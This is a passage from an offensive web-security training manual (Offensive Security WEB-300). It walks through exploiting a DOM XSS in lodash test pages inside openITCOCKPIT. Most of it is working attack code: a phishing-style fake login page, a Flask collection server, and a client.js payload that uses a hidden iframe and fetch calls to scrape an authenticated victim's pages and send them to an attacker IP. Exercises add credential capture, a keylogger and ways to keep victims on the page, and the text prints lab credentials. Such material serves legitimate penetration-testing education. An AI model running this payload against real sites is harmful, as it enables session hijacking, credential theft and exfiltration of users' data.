'none' 
./lodash-3.9.3/test/index.html:             document.write('<script src="' + 
ui.buildPath + '"><\/script>'); 
./lodash-3.9.3/test/index.html:         document.write((ui.isForeign || 
ui.urlParams.loader == 'none') 
./lodash-3.9.3/test/backbone.html:          document.write(ui.urlParams.loader != 
'none' 
Listing 376 - Search For Write 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
358 
The results of this search reveal four unique files that write directly to the document. We also find 
interesting keywords like “urlParams” in the ui object that potentially point to the use of user-
provided data. Let’s (randomly) inspect the /lodash-3.9.3/perf/index.html file. 
The snippet shown in Listing 377 is part of the /lodash-3.9.3/perf/index.html file. 
<script src="./asset/perf-ui.js"></script> 
<script> 
        document.write('<script src="' + ui.buildPath + '"><\/script>'); 
</script> 
<script> 
        var lodash = _.noConflict(); 
</script> 
<script> 
        document.write('<script src="' + ui.otherPath + '"><\/script>'); 
</script> 
Listing 377 - Discovered potential XSS 
In Listing 377, we notice the use of the document.write function to load a script on the web page. 
The source of the script is set to the ui.otherPath and ui.buildPath variable. If this variable is user-
controlled, we would have access to DOM-based XSS. 
Although we don’t know the origin of ui.buildPath and ui.otherPath, we can search the included 
files for clues. Let’s start by determining how ui.buildPath is set with grep. We know that 
JavaScript variables are set with the “=” sign. However, we don’t know if there is a space, tab, or 
any other delimiter between the “buildPath” and the “=” sign. We can use a regex with grep to 
compensate for this. 
kali@kali:~/packages$ grep -r "buildPath[[:space:]]*=" ./  
./lodash-3.9.3/test/asset/test-ui.js:  ui.buildPath = (function() { 
./lodash-3.9.3/perf/asset/perf-ui.js:  ui.buildPath = (function() { 
Listing 378 - Searching for buildPath 
The search revealed two files: asset/perf-ui.js and asset/test-ui.js. Listing 377 shows that 
./asset/perf-ui.js is loaded into the HTML page that is being targeted. Let’s open the perf-ui.js file 
and navigate to the section where buildPath is set. 
kali@kali:~/packages$ cat ./lodash-3.9.3/perf/asset/perf-ui.js 
... 
  /** The lodash build to load. */ 
  var build = (build = /build=([^&]+)/.exec(location.search)) && 
decodeURIComponent(build[1]); 
... 
  // The lodash build file path. 
  ui.buildPath = (function() { 
    var result; 
    switch (build) { 
      case 'lodash-compat':     result = 'lodash.compat.min.js'; break; 
      case 'lodash-custom-dev': result = 'lodash.custom.js'; break; 
      case 'lodash-custom':     result = 'lodash.custom.min.js'; break; 
      case null:                build  = 'lodash-modern'; 
      case 'lodash-modern':     result = 'lodash.min.js'; break; 
      default:                  return build; 
    } 
    return basePath + result; 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
359 
  }()); 
... 
Listing 379 - perf-ui.js 
The ui.buildPath is set near the bottom of the file. A switch returns the value of the build variable 
by default if no other condition is true. The build variable is set near the beginning of the file and is 
obtained from location.search (the query string) and the value of the query string is parsed using 
regex. The regex looks for “build=” in the query string and extracts the value. We do not find any 
other sanitization of the build variable in the code. At this point, we should have a path to DOM 
XSS through the “build” query parameter! 
10.5.1.1 Exercise 
Using what we have discovered in this section, create an XSS that displays an alert message. 
10.6 Advanced XSS Exploitation 
After completion of the exercise we should have a basic working XSS exploit, but an alert box is 
far from “exploitation”. We need to devise a strategy to escalate our current level of access. 
However, we have a very limited amount of information that we can use to create a targeted XSS 
attack. 
10.6.1 What We Can and Can’t Do 
A reflected DOM-based XSS vulnerability provides limited opportunities. Let’s discuss what we 
can and can’t do at this point. 
First, we will need a victim to exploit. Unlike stored XSS, which can exploit anyone who visits the 
page, we will have to craft a specific link to send to a victim. Once the victim visits the page, the 
XSS will be triggered. 
If we use Burp to inspect any of the requests and responses sent to and from the application, we 
may notice a cookie named itnovum. Since we don’t have credentialed access to the application, 
we can only assume that this is the cookie used for session management. Under the Storage tab 
in Firefox’s developer tools, we find that the cookie also has the HttpOnly202 flag set. This means 
that we won’t be able to access the user’s session cookie using XSS. Instead of stealing the 
session cookie, we will have to find a different way to get information about the victim and the 
host. 
 
202 (OWASP, 2020), https://owasp.org/www-community/<httpOnly 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
360 
 
Figure 276: Checking HttpOnly 
While we won’t have access to the user’s session cookie, we do have access to the DOM, and we 
can control what is loaded and rendered on the web page with XSS. Conveniently, when a user’s 
browser requests content from a web page (whether it is triggered by a refresh or by JavaScript), 
the browser will automatically include the session cookie in the request. This is true even if 
JavaScript doesn’t have direct access to the cookie value. This means that we can add content to 
the DOM via XSS of an authenticated victim to load resources only accessible by authenticated 
users. While JavaScript has access to manipulate the DOM, the browser sets certain restrictions 
to what JavaScript has access to via the Same-Origin Policy (SOP).203 
The SOP allows different pages from the same origin to communicate and share resources. For 
example, 
the 
SOP 
allows 
JavaScript 
running 
on 
https://openitcockpit/js/vendor/lodash/perf/index.html 
to 
send 
a 
request 
using 
XMLHttpRequest(XHR)204 or fetch205 to https://openitcockpit/ and read the contents of the 
response. Since we have XSS on the domain we are targeting, we can load any page from the 
 
203 (Mozilla, 2020), https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy 
204 (Mozilla, 2020), https://developer.mozilla.org/en-US/docs/Web/API/XML<httpRequest 
205 (Mozilla, 2020), https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
361 
same source and retrieve its contents. The benefit of this is that if the victim of the XSS is already 
authenticated, the browser will automatically send their session cookie when the content is 
requested via XHR, giving us a means of accessing authenticated content by riding an existing 
user’s session. 
It is important to note that this also means that the SOP disallows JavaScript 
from reaching out and accessing content from different origins. For example, 
JavaScript running on https://evil.com cannot send XHR requests to 
https://google.com. 
Using this information, we can use the XSS to scrape the home page that our authenticated 
victim has access to. Once loaded, we can find all links, load the links using XHR, and forward the 
content back to us. This will give us access to the authenticated user’s data and potentially open 
a new avenue for exploitation. 
It is important to note that an XSS is only running while the victim has the window open with the 
XSS. While there are tricks that slow down the victims’ ability exit the window, we still want to run 
the XSS as quickly as possible. 
While we could utilize some features from The Browser Exploitation Framework(BeEF),206 we are 
opting out of using BeEF. A significant effort in development of a new plugin and configuration of 
BeEF would be necessary for the result we are looking for. Instead, we will write our own 
application. The application will consist of 3 main components: the XSS payload script, a 
SQLite207 database to store collected content, and a Flask208 API server to receive content 
collected by the XSS payload. While the database is not completely necessary, it will make the 
application more extensible for some Extra Mile challenges. 
In addition to the 3 main components, we have additional criteria: 
1. 
The XSS page must look convincing enough to ensure the victim won’t leave the page. 
2. 
Second, the content we scraped and stored in the database will be used to recreate the 
remote HTML files locally. We will create a separate script to dump the contents of the 
database. 
3. 
The database script must be written in a way so that it can be imported and used in multiple 
scripts. This will save us time and ensure code can be reused. 
We will start by creating a realistic landing page from the XSS that we discovered earlier. 
10.6.2 Writing to DOM 
Now that we are aware of our limitations and have a specific goal, we will begin manipulating the 
DOM to display a realistic openITCOCKPIT page. The Firefox Developer Tools209 will be immensely 
helpful during this process. 
 
206 (BeEF, 2020), https://beefproject.com/ 
207 (SQLite, 2020), https://www.sqlite.org/index.html 
208 (The Pallets Project, 2020), https://palletsprojects.com/p/flask/ 
209 (Mozzila, 2020), https://developer.mozilla.org/en-US/docs/Tools 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
362 
First, 
we 
will 
load 
the 
page 
with 
the 
XSS 
vulnerability 
(https://openitcockpit/js/vendor/lodash/perf/index.html) and click the Deactivate Firebug button in 
the top right to prevent the page from consuming too many resources. 
 
Figure 277: Stopping Firebug Execution 
We can open the Firefox console with C+B+k, where we can type in any JavaScript to test 
the outcome before we place it into our final script. 
Using the document interface, we can query for HTML elements via the getElementByID and 
getElementsByTagName methods. We can change the content of an HTML element with the 
innerHTML property. We can also create new elements with createElement method. 
For 
example, 
we 
can 
query 
for 
all 
“body” 
elements 
using 
document.getElementsByTagName(“body”) and access the first (and only) item in the array 
with [0]. 
Notice that the action is plural when querying for multiple elements 
(getElementsByTagName) while “element” is singular when querying for a single 
element (getElementByID). Typically, we expect multiple elements when querying 
by the tag name (div, p, img) but expect an element to use a unique ID. When 
using methods that return multiple objects, we should expect an array to be 
returned even if only a single object is found. 
>> document.getElementsByTagName("body")[0] 
<- <body> 
Listing 380 - Querying for body elements 
We can save the reference to the object by prepending the command with body = . 
>> body = document.getElementsByTagName("body")[0] 
<- <body> 
Listing 381 - Saving body element to variable 
Next, we can get the contents of body by accessing the innerHTML property. 
>> body.innerHTML 
<- " 
    <div id=\"perf-toolbar\"><span style=\"float: right;\"> 
    ... 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
363 
    </script> 
  " 
Listing 382 - Accessing body’s innerHTML 
We can also overwrite the HTML in body by setting innerHTML equal to a string of valid HTML. 
>> body.innerHTML = "<h1>Magic!</h1>" 
<- "<h1>Magic!</h1>" 
Listing 383 - Setting the innerHTML 
Once the code is executed, we’ll change the page to display the text “Magic” with an h1 tag. 
 
Figure 278: Magic in Browser 
Using this method, we can control every aspect of the user experience. Later, we will expand on 
these concepts and use XHR requests to retrieve content in a way the victim won’t notice. 
10.6.2.1 Exercises 
1. 
Obtain the HTML from the openITCOCKPIT login page and rewrite the DOM to mimic the 
login exactly. Hint: It is also possible to query for the html element, which is at a higher level 
than the body element. The html element will make the modification easier. You should not 
have to run any XHR requests at this point. Hardcoded HTML will suffice. 
2. 
Save the code created in this exercise into a file named client.js. We will later write it to a file 
so that the XSS we discovered earlier can automatically load it. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
364 
10.6.2.2 Extra Mile 
Change the form of the fake login page to prevent the form from loading a new page. Currently, if 
a user submits their credentials in the fake login page, we will not capture it and the user will be 
redirected away from the XSS. We want to keep the user on this page for as long as possible. 
Don’t worry about grabbing the data and sending it over just yet. We’ll cover this in a following 
section. 
10.6.3 Creating the Database 
A login page will make the XSS page look more realistic, but it isn’t very useful in furthering 
exploitation. Before we devise a method of sending and receiving content from the victim, we will 
need a system of capturing and storing data (either user input or data obtained from the victims’ 
session). To store data, we will use a SQLite database. We will start by creating a script to 
initialize the database and provide functions to insert data. The database script should be able to 
be run from the command line. In addition, both the API server and script to dump the database 
should be able to import the functions from the database script. Allowing the script to be 
imported will make our code reusable and more organized. 
Our script will accept four main arguments: one to create a database, another to insert content, a 
third to get content, and the final to list the location (URL) the content was obtained from. The 
purpose of allowing the database script to be executed from the command line is to ease the 
development process by allowing us to test each function. 
We will use argparse210 to determine the actions for each argument. Before we start parsing 
arguments, we will import the necessary modules. The content in Listing 384 will be saved to a 
file named db.py. 
import sqlite3 
import argparse 
import os 
Listing 384 - Required imports 
Next, we will define the filename to save the database and write the parser for the arguments. We 
only want to parse arguments if the script is executed directly and not if it is imported. When 
python is executed directly, it sets the __name__ variable to __main__. We can check for this before 
we parse the arguments: 
if __name__ == "__main__": 
    database = r"sqlite.db" 
    parser = argparse.ArgumentParser() 
    group = parser.add_mutually_exclusive_group(required=True) 
    group.add_argument('--create','-c', help='Create Database', action='store_true') 
    group.add_argument('--insert','-i', help='Insert Content', action='store_true') 
    group.add_argument('--get','-g', help='Get Content', action='store_true') 
    group.add_argument('--getLocations','-l', help='Get all Locations', 
action='store_true') 
 
    parser.add_argument('--location','-L') 
 
210 (Python, 2020), https://docs.python.org/3/library/argparse.html 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
365 
    parser.add_argument('--content','-C') 
    args = parser.parse_args() 
Listing 385 - Parsing args of db.py 
We first define the database filename as sqlite.db. Next, will need to parse the arguments so they 
execute the appropriate function. This script will have five functions: create_connection, 
insert_content, create_db, get_content, and get_locations. These functions will all be called 
depending on the argument passed to the script. However, all actions will require a database 
connection. 
Just below the last line in Listing 385, we will add this content: 
    conn = create_connection(database) 
 
    if (args.create): 
        print("[+] Creating Database") 
        create_db(conn) 
    elif (args.insert): 
        if(args.location is None and args.content is None): 
            parser.error("--insert requires --location, --content.") 
        else: 
            print("[+] Inserting Data") 
            insert_content(conn, (args.location, args.content)) 
            conn.commit() 
    elif (args.get): 
        if(args.location is None): 
            parser.error("--get requires --location, --content.") 
        else: 
            print("[+] Getting Content") 
            print(get_content(conn, (args.location,))) 
    if (args.getLocations): 
        print("[+] Getting All Locations") 
        print(get_locations(conn)) 
Listing 386 - Calling the appropriate function 
The code in Listing 386 will first establish a database connection. Once established, the script will 
check if any of the arguments were called and call the appropriate function. Some arguments, like 
get and insert, require additional parameters like location and content. 
With the arguments parsed, we can begin writing the function to create the database connection. 
This function will accept a file name as an argument. The file name will be passed into the 
function sqlite3.connect() to create the connection. If successful, the connection will be returned. 
def create_connection(db_file): 
    conn = None 
    try: 
        conn = sqlite3.connect(db_file) 
    except Error as e: 
        print(e) 
    return conn 
Listing 387 - create_connection Function 
We’ll add the create_connection function just under the imports. With the database connection 
created, we can concentrate on creating the table in the database. The table that stores the 
content will have three columns: 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
366 
1. 
An integer that auto-increments as the primary key. 
2. 
The location, in the form of a URL, that the content was obtained from. 
3. 
The content in the form of a blob. 
The SQL to create the table is shown below: 
CREATE TABLE IF NOT EXISTS content ( 
    id integer PRIMARY KEY, 
    location text NOT NULL, 
    content blob 
); 
Listing 388 - SQL to create the content table 
This SQL command will be executed in the create_db function, which will accept a connection and 
execute the CREATE TABLE command. If the execution fails, an error will be printed. This function 
is shown in Listing 389. 
def create_db(conn): 
    createContentTable="""CREATE TABLE IF NOT EXISTS content ( 
            id integer PRIMARY KEY, 
            location text NOT NULL, 
            content blob);""" 
    try: 
        c = conn.cursor() 
        c.execute(createContentTable) 
    except Error as e: 
        print(e) 
Listing 389 - create_db Function 
We’ll include this function after the create_connection function. At this point, we should be able to 
run python3 db.py –create to create the database. 
kali@kali:~/scripts$ python3 db.py --create 
[+] Creating Database 
kali@kali:~/scripts$ ls -alh 
total 20K 
drwxr-xr-x  2 kali kali 4.0K May 21 16:23 . 
drwxr-xr-x 27 kali kali 4.0K May 21 16:22 .. 
-rw-r--r--  1 kali kali 1.9K May 21 16:23 db.py 
-rw-r--r--  1 kali kali 8.0K May 21 16:23 sqlite.db 
Listing 390 - Running db.py to Create the Database 
Success! We have confirmed that our script can create a database file. 
10.6.3.1 Exercises 
1. 
Finish creating the script by finishing the rest of the functions: insert_content, get_content, 
and get_locations. 
• 
insert_content should return the rowid of the last inserted content. 
• 
get_content should only return the content stored based off a location. 
• 
get_locations should return a list of all locations in the database. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
367 
2. 
Run the script to create a database with an empty content table. Add some data to confirm 
that your function are working as expected. Once confirmed, delete the sqlite.db file and 
recreate an empty database. 
10.6.4 Creating the API 
Now that we have completed the database script, we’ll work on the application that will collect the 
data sent from the user’s browser. This data will be stored in the SQLite database that we just 
created. 
We will build the API server with Flask and we’ll name the file api.py. We will also import some 
functions from the db.py file that we just created and the flask_cors211 module. 
We selected the Flask framework since it’s easy to start and does not require significant 
configuration. Flask extensions (like flask_cors) extend the functionality of the web application 
without significant amounts of code. We’ll use the flask_cors extension to send the “CORS” 
header, which we’ll discuss in more detail. 
from flask import Flask, request, send_file 
from db import create_connection, insert_content, create_db 
from flask_cors import CORS 
Listing 391 - Imports for api.py 
For this section, we will need pip to install flask-cors. If it is not already installed, 
we can install it in Kali with “sudo apt install python3-pip”. To install flask_cors, 
run “sudo pip3 install flask_cors”. 
Next, we need to define the Flask app and the CORS extension. Since we will be calling this API 
server using the XSS, we also need to set the Cross-Origin Resource Sharing(CORS)212 header. The 
CORS header instructs a browser to allow XHR requests to access resources from other origins. 
In the case of the XSS we have discovered, we want to instruct the browser to allow the XSS 
payload (running from https://openitcockpit) to be able to reach out to our API server to send the 
discovered content. Finally, we will also need to define the database file we are using (this will be 
the same database we created in the script earlier). Below the imports we will add the code found 
in Listing 392. 
app = Flask(__name__) 
CORS(app) 
database = r"sqlite.db" 
Listing 392 - Defining the Flask app and setting the CORS header 
The CORS(app) command sets the CORS header to accept connections from any domain. With 
that set, we can start the web server with app.run. However, since openITCOCKPIT runs on 
HTTPS, any modern browser will block mixed requests (HTTPS to HTTP). To get around this, we’ll 
run the Flask application on port 443 and generate a self-signed certificate and key. Since the 
certificate will be self-signed, we will also need to accept the certificate in Firefox for our Kali’s IP 
address. 
 
211 (Cory Dolphin, 2013), https://flask-cors.readthedocs.io/en/latest/ 
212 (Mozilla, 2020), https://developer.mozilla.org/en-US/docs/Web/<http/CORS 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
368 
Normally, we would use a properly-issued certificate and purchase a domain to host the API 
server, but for the purposes of this module, a self-signed certificate will suffice. A key and 
certificate can be generated using the openssl command. 
kali@kali:~/scripts$ openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout 
key.pem -days 365 
Generating a RSA private key 
......................................................................................
.............++++ 
.............................++++ 
writing new private key to 'key.pem' 
----- 
You are about to be asked to enter information that will be incorporated 
into your certificate request. 
What you are about to enter is what is called a Distinguished Name or a DN. 
There are quite a few fields but you can leave some blank 
For some fields there will be a default value, 
If you enter '.', the field will be left blank. 
----- 
Country Name (2 letter code) [AU]: 
State or Province Name (full name) [Some-State]: 
Locality Name (eg, city) []: 
Organization Name (eg, company) [Internet Widgits Pty Ltd]: 
Organizational Unit Name (eg, section) []: 
Common Name (e.g. server FQDN or YOUR name) []:kali 
Email Address []: 
Listing 393 - Generating Key and Certificate 
With the certificate and key generated, we will load them into the API application and specify the 
host and port to run on. 
app.run(host='0.0.0.0', port=443, ssl_context=('cert.pem', 'key.pem')) 
Listing 394 - Starting the Flask app 
We’ll enter the code in Listing 394 below the configuration of the app and database variables. This 
line will always be the last line of this script. 
Now that the Flask server is set to run, we need to create some endpoints. The first endpoint will 
respond with the contents of client.js (the XSS payload) to allow the XSS to load our payload. 
We’ll use a Python decorator213 to set the route. Specifically, we’ll set the name of the route and 
the method that will be allowed (GET). We will send the client.js file with Flask’s send_file function. 
The code for this is shown in Listing 395 and will be entered after the configuration of the app and 
database variables but before app.run is called: 
@app.route('/client.js', methods=['GET']) 
def clientjs(): 
    print("[+] Sending Payload") 
    return send_file('./client.js', attachment_filename='client.js') 
Listing 395 - Responding with client.js 
 
213 (Hackers And Slackers, 2020), https://hackersandslackers.com/flask-routes/#defining-routes 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
369 
Running the API with sudo python3 api.py should start the listener on port 443. 
kali@kali:~/scripts$ sudo python3 api.py 
 * Serving Flask app "api" (lazy loading) 
 * Environment: production 
   WARNING: This is a development server. Do not use it in a production deployment. 
   Use a production WSGI server instead. 
 * Debug mode: off 
 * Running on https://0.0.0.0:443/ (Press CTRL+C to quit) 
[+] Sending Payload 
Listing 396 - Starting the API Server 
Opening a browser to https://<Your Kali IP>/client.js and accepting the self-signed certificate 
should display the client.js file that we’ve created earlier. This URL will become the source of the 
payload for the XSS. 
10.6.4.1 Exercise 
1. 
Finish the script to accept a POST request with the HTML contents of an entire page (which 
we will obtain later) and the URL of where the contents were obtained from. The parameters 
should be named content and url, respectively. 
2. 
Exploit the XSS discovered earlier but this time use https://<Your Kali IP>/client.js as the 
payload. If successful, the XSS should display the fake Login page. 
10.6.4.2 Extra Mile 
Add the ability to store credentials and any accessible cookies that are obtained from an XSS 
victim. Some cookies might contain the HttpOnly attribute, making them inaccessible from 
JavaScript. However, we should capture all cookies that do not have the HttpOnly attribute. The 
credentials and cookies should be stored in separate tables and will require modifications to the 
database script as well. 
10.6.5 Scraping Content 
Now that we have a web server to send our data to and a database to store the data, we need to 
finish the client.js script that targets the authenticated victim and will scrape the data they have 
access to. In addition to replacing the DOM with the fake login page that was created earlier, there 
will be four additional steps. Our script will: 
1. 
Load the home page. 
2. 
Search for all unique links and save their hrefs. 
3. 
Fetch the content of each link. 
4. 
Send the content obtained from each link to our API server. 
At this point, we do not know the URL of the homepage for an authenticated user. However, since 
visiting the root of the application as an unauthenticated user redirects to a login page, we can 
assume the root of the application will redirect to an authenticated page if a session exists. While 
we will use XHR requests to fetch the content of each link we find, we don’t want to use an XHR 
request on the home page since we don’t know if the JavaScript sources running on the home 
page add additional links to the DOM after the page is loaded. Instead, we will use an iframe since 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
370 
it will load the page, follow any redirects, and render any JavaScript. Once the page is fully loaded, 
we can grab all the links that the authenticated user has access to. 
In addition to loading the home page, there are a few additional important items to consider 
regarding loading the links we discover. First, we don’t want to follow a link that will log out the 
current session. So we will avoid any links that contain the words “logout”, “log-out”, “signout”, or 
“sign-out”. Second, we don’t want to scrape all links as soon as we open the iframe. We have 
already seen that openITCOCKPIT loads a lot of JavaScript. This JavaScript could load additional 
content after the HTML is rendered. To avoid this, we will wait a few seconds after the page is 
“loaded” to ensure that everything is added to the DOM. 
We will add JavaScript beneath the existing client.js code that will create a full-page iframe 
element, set an onload action, and set the source of the page to the root of openITCOCKPIT. The 
JavaScript code for this is shown in Listing 397. 
var iframe = document.createElement('iframe'); 
iframe.setAttribute("style","display:none") 
iframe.onload = actions; 
iframe.width = "100%" 
iframe.height = "100%" 
iframe.src = "https://openitcockpit" 
 
body = document.getElementsByTagName('body')[0]; 
body.appendChild(iframe) 
Listing 397 - Creating a homepage iframe 
We don’t want the victim to see the page loading, so we will set the style attribute to 
“display:none”. Even though the iframe is not shown, the browser will still load the page. 
The third line in Listing 397 references an actions function that does not currently exist. The 
actions function is the callback that defines the actions we want to perform when the page is 
loaded. As described earlier, we will wait five seconds to ensure that all content is fully loaded and 
added to the DOM. This might not be necessary, but in a black box scenario, it’s better to exercise 
caution. After the delay, we will call the function that will grab the content we are looking for. 
function actions(){ 
    setTimeout(function(){ getContent() }, 5000); 
} 
Listing 398 - Actions function 
We are separating a lot of the actions into separate functions. This is not 
absolutely necessary but this will make the code more manageable when we add 
more functionality, especially in the Extra Mile exercise. 
The actions function waits five seconds and calls getContent(): 
function getContent(){ 
} 
Listing 399 - getContent definition 
In getContent(), we will grab all the a elements from the iframe, extract all href tags from the a 
elements, remove all duplicate links, and check the validity of the href URL. When we grab all a 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
371 
elements the getElementsByTagName function will return a HTMLCollection. For further 
processing, we must convert the HTMLCollection to an Array: 
allA = iframe.contentDocument.getElementsByTagName("a") 
 
allHrefs = [] 
for (var i=0; i<allA.length; i++){ 
    allHrefs.push(allA[i].href) 
} 
Listing 400 - Grabbing all a elements 
Next, we need to make sure that the array only contains unique values to reduce the traffic we are 
sending. The library we are currently exploiting for XSS, lodash, has a “unique” function that can 
handle this. To access this library, we will use the underscore (_) character.214 We’ll pass the 
allHrefs array into the unique function and save the output into uniqueHrefs. 
uniqueHrefs = _.unique(allHrefs) 
Listing 401 - Obtaining only unique hrefs 
Now that we have a list of all unique hrefs, we need to check if the href is a valid URL and remove 
any links that might log out the current user. In Listing 402, we first create a new array where we 
can store only the valid URLs. Next, we loop through the uniqueHrefs, run the href through a 
function(validURL) to check if the URL is valid and verify that it will not log out the target. The 
validURL function is not currently implemented and will be left as an exercise. 
validUniqueHrefs = [] 
for(var i=0; i<uniqueHrefs.length; i++) { 
    if (validURL(uniqueHrefs[i])){ 
        validUniqueHrefs.push(uniqueHrefs[i]); 
    } 
} 
Listing 402 - Checking for valid URL 
Next, we will send a GET request to each valid and unique href, encode the content, and send the 
content over to our API server. We will use the fetch method to make these requests. 
The code block in Listing 403 will loop through each valid, unique href and GET the content. Since 
we don’t want a user’s browser to completely freeze during this operation, we’ll run the request as 
an asynchronous task. The reason for using the fetch method is that will return a JavaScript 
promise.215 A promise handles asynchronous operations once they complete or fail. Instead of 
blocking the entire thread as the code executes, a function passed in to the promise will be 
executed once the operation is complete. This also allows us to tie multiple promises together to 
ensure one method only executes after another completes. 
The promise returned by the fetch will be handled by .then and the response will be passed in as 
an argument to the function. The text from the response is obtained (which returns another 
promise) and passed into another .then function. Within the final .then function, the text is sent to 
our API server along with the source URL: 
 
214 (Lodash, 2015), https://github.com/lodash/lodash/blob/1.3.1/doc/README.md#_uniqarray--issortedfalse-callbackidentity-thisarg 
215 (Mozilla, 2020), https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
372 
validUniqueHrefs.forEach(href =>{ 
    fetch(href, { 
        "credentials": "include", 
        "method": "GET", 
    }) 
    .then((response) => { 
      return response.text() 
    }) 
    .then(function (text){ 
      fetch("https://192.168.119.120/content", { 
        body: "url=" + encodeURIComponent(href) + "&content=" + 
encodeURIComponent(text), 
        headers: { 
          "Content-Type": "application/x-www-form-urlencoded" 
        }, 
        method: "POST" 
      }) 
    }); 
}) 
Listing 403 - Obtaining authenticated content 
To recap, our JavaScript should now load the homepage (if the user is logged in) and scrape all 
links. The obtained links are then checked for validity and any logout links are removed. Finally, 
each link is visited in the background of the user’s browser and the contents are forwarded to our 
API server for storage. 
10.6.5.1 Exercises 
1. 
Complete the script by creating the validURL function. The function should return all valid 
HTTP and HTTPS URLs that do not contain any keywords will log out the victim. Ideally we 
would only want to target the domain the XSS is running on. However, at this point, we are 
not aware of how the developers built the links, so we will accept any valid HTTP and HTTPS 
links. 
2. 
Using the credentials view@viewer.local:27NZDLgfnY, login to openITCOCKPIT and XSS that 
user. It might be tempting to poke around, but remember we are treating this as a black box 
module. In a real world scenario, we would not have access to these credentials. 
10.6.5.2 Extra Miles 
1. 
Capture any pre-filled passwords the user has saved in their browser. Send the captured 
credentials to the API Server. 
2. 
Capture Login Events if the user we are targeting types in their credentials and clicks “Sign 
in”. Send the captured credentials to the API Server. This can also be done by creating a 
JavaScript keylogger. 
3. 
The longer the user is on this page, the more data we can obtain from them. Devise a 
technique to keep the user on the page longer. 
10.6.6 Dumping the Contents 
At this point, we should have a database full of content from an authenticated user. The next step 
is to dump this data into files that are easier to manage. We’ll create a Python script that imports 
and expands on our db.py script. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
373 
We’ll start off by importing all the necessary libraries and modules. In this case, we need os to be 
able to write the file and we need create_connection, get_content, and get_locations from db.py to 
get the content. We will also need a variable for the database name we will be using and the 
directory that we want to place the files into. The contents of Listing 404 will be saved to 
dump.py: 
import os 
from db import create_connection, get_content, get_locations 
 
database = r"sqlite.db" 
contentDir = os.getcwd() + "/content" 
Listing 404 - Required imports for dump.py 
Next, we can begin creating the main section of the script. First, we will need to make a database 
connection and query all locations. For each location, we will query for the content and write the 
content to the appropriate file. The code for this section is shown in Listing 405. 
if __name__ == '__main__': 
    conn = create_connection(database) 
    locations = get_locations(conn) 
    for l in locations: 
        content = get_content(conn, l) 
        write_to_file(l[0], content) 
Listing 405 - Main section of dump.py 
Next, we’ll complete the write_to_file function, which stores the contents of each location into an 
html file. If a location contains a subdirectory, it must be stored in a folder with the same name as 
the subdirectory. Conveniently, the structure of a URL also fits a URL path and not much 
modification needs to occur. The write_to_file function is shown in Listing 406. 
def write_to_file(url, content): 
    fileName = url.replace('https://','') 
    if not fileName.endswith(".html"): 
        fileName = fileName + ".html" 
    fullname = os.path.join(contentDir, fileName) 
    path, basename = os.path.split(fullname) 
    if not os.path.exists(path): 
        os.makedirs(path) 
    with open(fullname, 'w') as f: 
        f.write(content) 
Listing 406 - write_to_file Function 
The write_to_file function can be placed below the creation of the contentDir variable but 
above the if statement that checks if the __name__ variable is set to __main__. 
10.6.6.1 Exercise 
Use the script to dump the contents of the sqlite database. 
10.7 RCE Hunting 
Now that we have access to the content of an authenticated user, we can start hunting for 
something that will lead us closer to running system commands. First, we’ll inspect the files we 
currently have access to. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
374 
10.7.1 Discovery 
The discovery process is not automated and can be time-consuming. However, we can look for 
keywords that trigger our hacker-senses in order to speed up this process. For example, the 
commands.html, cronjobs.html, and serviceescalations.html files we obtained from the victim 
immediately catch our attention as the names of the files suggest that they may permit system 
access. 
Interestingly, content/openitcockpit/commands.html contains an object named appData, which 
contains some interesting variables: 
var appData = 
{"jsonData":{"isAjax":false,"isMobile":false,"websocket_url":"wss:\/\/openitcockpit\/s
udo_server","akey":"1fea123e07f730f76e661bced33a94152378611e"},"webroot":"https:\/\/op
enitcockpit\/","url":"","controller":"Commands","action":"index","params":{"named":[],
